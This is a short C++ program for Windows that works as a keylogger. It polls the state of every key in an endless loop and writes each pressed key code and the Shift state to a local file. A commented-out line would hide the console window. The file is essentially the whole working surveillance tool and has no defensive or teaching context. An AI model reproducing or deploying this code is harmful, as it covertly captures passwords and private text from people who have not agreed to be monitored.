/*
  This is Iancu's work
  It cost, ... everything
                         */
#include <fstream>
#include <windows.h>
#include <time.h>

using namespace std;

const int PRESSED = -32767, SHIFT_1 = 16, SHIFT_2 = 160;

int main() {
  //FreeConsole();

  ofstream out("ascii");

  while (true) {
    for (unsigned short ch = 0; ch < 250; ch ++)
      if (GetAsyncKeyState(ch) == PRESSED && ch != SHIFT_1 && ch != SHIFT_2)
        out << ch << " " << bool(GetKeyState(VK_SHIFT) < 0) << "\n";
    out.flush();
    Sleep(10);
  }

  out.close();
  return 0;
}
